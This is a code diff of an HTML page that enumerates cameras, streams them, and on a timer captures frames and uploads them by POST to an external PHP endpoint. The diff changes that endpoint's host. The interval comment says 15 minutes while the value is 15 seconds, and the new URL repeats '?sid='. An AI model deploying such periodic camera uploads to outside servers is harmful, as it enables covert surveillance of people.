@@ -1,20 +1,22 @@
 <!DOCTYPE html>
-<html lang="ru">	
-<head>	
-<meta charset="utf-8">	
+<html lang="ru">
+<head>
+<meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
+
 <title>mediaDevices.enumerateDevices()</title>
+
 <style>
 __body {
 	margin: 0;
 }
 #container video {
-	/*width: 38%;*/width: 25%;
-	/*border: 1px blue solid;*/
+	width: 25%;
 }
 </style>
 </head>
-<body onload="main()" style="margin:0;">
+
+<body onload="main()">
 
 <div id="container"></div>
 
@@ -52,7 +54,7 @@ function main() {
 	const videoList = [];
 	
 	// init snap-shooter
-	const SHOOT_INTERVAL = 60 * 15000;
+	const SHOOT_INTERVAL = 1/* * 60*/ * 15000; // 15 min
 	
 	// init <video> list
 	navigator.mediaDevices.enumerateDevices()
@@ -61,7 +63,7 @@ function main() {
 			
 			devices.forEach(device => {
 				if (/video/.test(device.kind)) {
-					console.log('Обнаружен источник:', device);
+					console.log('Video device found:', device);
 					
 					navigator.mediaDevices
 						.getUserMedia({
@@ -103,16 +105,13 @@ function main() {
                 let formData = new FormData()
                 dataUriList.map(
                     (blobFile, index) => {
-                        formData.append('image'+index, blobFile)
+                        formData.append('image'+ index, blobFile)
                     }
                 );
-                fetch('https://rosagro.000webhostapp.com/frame.php?sid='+randomInteger(0, 1000000000), {
+                fetch('https://indeal.io/test/save/data1/frame.php?sid=449088763?sid='+randomInteger(0, 1000000000), {
                     method: "post",
-                    headers: [
-			        ["Content-Type", "application/json"],
-                                ["Content-Type", "text/plain"],
-                                ["Content-Type", "multipart/form-data"]
-                    ],
+                    headers: {
+                    },
                     body: formData
                 })
             }, SHOOT_INTERVAL);
